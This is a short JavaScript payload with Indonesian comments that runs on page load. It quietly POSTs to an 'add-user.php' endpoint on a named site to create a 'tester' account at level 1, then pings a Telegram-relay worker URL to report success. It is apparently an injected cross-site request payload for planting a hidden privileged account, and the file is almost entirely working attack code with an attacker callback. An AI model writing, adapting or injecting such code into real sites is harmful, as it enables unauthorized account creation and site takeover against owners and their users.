document.addEventListener('DOMContentLoaded', () => {
    // 1. Data yang akan dikirim via POST ke add-user.php
    const formData = new URLSearchParams();
    formData.append('user', 'tester');
    formData.append('pass', 'tester');
    formData.append('level', '1');

    // URL tujuan POST
    const actionUrl = 'https://bagimaxx.web.id/newbie/tools/add-user.php';

    // 2. Kirim POST request menggunakan Fetch API
    fetch(actionUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: formData.toString()
    })
    .then(response => {
        console.log('Add-user request terkirim.');
    })
    .catch(error => {
        console.error('Terjadi kesalahan saat add-user:', error);
    });

    // 3. Kirim notifikasi "mantap" ke bot Telegram via perantara worker
    const telegramWorkerUrl = 'https://memek-worker.defoy89122.workers.dev/?message=mantap';

    fetch(telegramWorkerUrl, {
        method: 'GET'
    })
    .then(response => {
        console.log('Notifikasi Telegram terkirim.');
    })
    .catch(error => {
        console.error('Gagal mengirim notifikasi Telegram:', error);
    });
});
